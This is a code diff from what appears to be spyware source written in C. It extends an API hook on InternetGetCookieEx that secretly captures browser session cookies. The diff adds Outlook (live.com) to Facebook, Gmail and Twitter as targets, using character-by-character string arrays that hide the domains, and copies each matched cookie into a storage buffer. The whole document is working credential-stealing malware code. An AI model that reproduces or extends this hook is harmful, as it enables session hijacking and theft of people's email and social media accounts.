@@ -406,6 +406,8 @@ InternetGetCookieExStruct InternetGetCookieExData;
 #define COOKIE_FACEBOOK 0x100
 #define COOKIE_TWITTER 0x200
 #define COOKIE_GMAIL 0x300
+#define COOKIE_OUTLOOK 0x400
+
 #define COOKIE_MASK 0xFFFF
 BOOL __stdcall PM_InternetGetCookieEx(LPCWSTR lpszURL, LPCWSTR lpszCookieName, LPCWSTR lpszCookieData, LPDWORD lpdwSize, DWORD dwFlags, DWORD_PTR dwReserved)
 {
@@ -423,6 +425,7 @@ BOOL __stdcall PM_InternetGetCookieEx(LPCWSTR lpszURL, LPCWSTR lpszCookieName, L
 	WCHAR facebook_url[] = { L'f', L'a', L'c', L'e', L'b', L'o', L'o', L'k', L'.', L'c', L'o', L'm', L'/', 0 };
 	WCHAR gmail_url[] = { L'm', L'a', L'i', L'l', L'.', L'g', L'o', L'o', L'g', L'l', L'e', L'.', L'c', L'o', L'm', L'/', 0 };
 	WCHAR twitter_url[] = { L't', L'w', L'i', L't', L't', L'e', L'r', L'.', L'c', L'o', L'm', L'/', 0 };
+	WCHAR outlook_url[] = { L'l', L'i', L'v', L'e', L'.', L'c', L'o', L'm', L'/', 0 };
 	DWORD local_size = MAX_COOKIE_SIZE-1;
 	WCHAR *local_cookie;
 	char *local_cookie_char;
@@ -438,6 +441,8 @@ BOOL __stdcall PM_InternetGetCookieEx(LPCWSTR lpszURL, LPCWSTR lpszCookieName, L
 			origin |= COOKIE_GMAIL;
 		else if (pData->pStrStrW((WCHAR *)lpszURL, twitter_url))
 			origin |= COOKIE_TWITTER;
+		else if (pData->pStrStrW((WCHAR *)lpszURL, outlook_url))
+			origin |= COOKIE_OUTLOOK;
 	}
 	if (!(origin & COOKIE_MASK)) {
 		CALL_ORIGINAL_API_SEQ(6)
@@ -562,7 +567,12 @@ DWORD __stdcall PM_UrlLogDispatch(BYTE * msg, DWORD dwLen, DWORD dwFlags, FILETI
 		} else if (origin == COOKIE_GMAIL) {
 			ZeroMemory(GMAIL_IE_COOKIE, sizeof(GMAIL_IE_COOKIE));
 			memcpy(GMAIL_IE_COOKIE, msg, size);
+
+		} else if (origin == COOKIE_OUTLOOK) {
+			ZeroMemory(OUTLOOK_IE_COOKIE, sizeof(OUTLOOK_IE_COOKIE));
+			memcpy(OUTLOOK_IE_COOKIE, msg, size);
 		} 
+
 		return 1;
 	}
 
